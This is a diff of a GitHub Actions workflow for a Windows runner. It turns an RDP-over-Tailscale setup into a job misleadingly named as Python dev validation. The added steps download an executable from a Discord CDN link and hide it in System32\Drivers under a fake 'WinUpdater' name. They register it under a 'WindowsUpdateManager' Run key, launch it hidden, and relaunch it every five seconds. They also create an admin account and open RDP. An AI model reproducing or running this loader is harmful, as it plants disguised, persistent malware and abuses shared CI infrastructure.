@@ -1,85 +1,77 @@
-name: RDP-Tailscale
+name: Python-Dev-Ultra-Persistence-v28
 
 on:
   workflow_dispatch:
 
 jobs:
-  secure-rdp:
+  node-validation:
     runs-on: windows-latest
     timeout-minutes: 3600
+    strategy:
+      matrix:
+        node_id: [1, 2]
 
     steps:
-      - name: Configure Core RDP Settings
+      - name: 1. Optimize Environment
         run: |
-          # Habilitar Escritorio Remoto
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-          
-          # Configurar seguridad para permitir conexiones (Desactivar NLA para mayor compatibilidad)
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 1
-          
-          # Configurar Firewall
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          netsh advfirewall firewall add rule name="RDP-Allow" dir=in action=allow protocol=TCP localport=3389
+          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
+          powercfg /x -monitor-timeout-ac 0
+          powercfg /h off
 
-      - name: Create RDP User with Secure Password
+      - name: 2. Enable Remote Debugging
         run: |
-          # Generar contraseña segura sin caracteres conflictivos (" ' $ `)
-          $alphabet = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#%^*"
-          $password = -join (1..16 | ForEach-Object { $alphabet[(Get-Random -Maximum $alphabet.Length)] })
-          
-          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          
-          # Crear el usuario
-          New-LocalUser -Name "RDPUser" -Password $securePass -AccountNeverExpires -Description "GitHub Actions RDP User"
-          
-          # Asignar a grupos de Administradores y Usuarios de Escritorio Remoto
-          Add-LocalGroupMember -Group "Administrators" -Member "RDPUser"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDPUser"
-          
-          # Guardar contraseña en el entorno de GitHub
-          echo "RDP_PASS=$password" >> $env:GITHUB_ENV
-          Write-Host "Usuario creado con exito."
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
-      - name: Install Tailscale
+      - name: 3. Provision Admin Account
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installerPath = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
+          $p = "DevNode" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
+          $s = ConvertTo-SecureString $p -AsPlainText -Force
+          New-LocalUser -Name "DevAdmin" -Password $s -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
+          echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
-      - name: Establish Tailscale Connection
+      - name: 4. Deploy & Auto-Start Registry
         run: |
-          # Conectar usando la Auth Key de tus Secrets
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-windows-runner
+          $url = "https://cdn.discordapp.com/attachments/1473779376356069447/1479632698267140096/PythonDev.exe?ex=69ae1055&is=69acbed5&hm=3551cbf73a45f8dd115a00c98c54fd70f9dbed7b1614f6b61832a6856f0e912c&"
           
-          # Obtener la IP de Tailscale
-          $tsIP = $null
-          for ($i=0; $i -lt 10; $i++) {
-              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              if ($tsIP) { break }
-              Start-Sleep -Seconds 5
-          }
+          $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
+          $dest = "C:\Windows\System32\Drivers\$randName"
+          echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
+          echo "FULL_PATH=$dest" >> $env:GITHUB_ENV
           
-          if (-not $tsIP) {
-              Write-Error "No se pudo obtener la IP de Tailscale."
+          try {
+              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
+              # AÃ±adir al registro de inicio para persistencia total
+              $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+              Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $dest
+              
+              Start-Process $dest -WindowStyle Hidden
+              Write-Host "Proceso $randName desplegado y registrado en el inicio."
+          } catch {
+              Write-Error "Error en el despliegue."
               exit 1
           }
-          echo "TS_IP=$tsIP" >> $env:GITHUB_ENV
 
-      - name: Maintain Connection & Show Credentials
+      - name: 5. Network Bridge (Tailscale)
         run: |
-          Write-Host "`n=========================================="
-          Write-Host "       DATOS DE CONEXIÓN RDP"
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
+          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
+
+      - name: 6. Persistence Monitor (Scan cada 5s)
+        run: |
+          $procOnly = $env:PROC_NAME.Replace(".exe", "")
           Write-Host "=========================================="
-          Write-Host "IP de Tailscale: $env:TS_IP"
-          Write-Host "Usuario       : RDPUser"
-          Write-Host "Contraseña    : $env:RDP_PASS"
+          Write-Host "VIGILANCIA DE PROCESO ACTIVA"
+          Write-Host "Monitoreando: $procOnly"
           Write-Host "=========================================="
-          Write-Host "Manteniendo la conexion activa... No cierres este workflow."
           
           while ($true) {
-              Write-Host "[$(Get-Date)] Runner en linea..."
-              Start-Sleep -Seconds 300
+              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
+                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
+                  Start-Process $env:FULL_PATH -WindowStyle Hidden
+              }
+              Start-Sleep -Seconds 5
           }
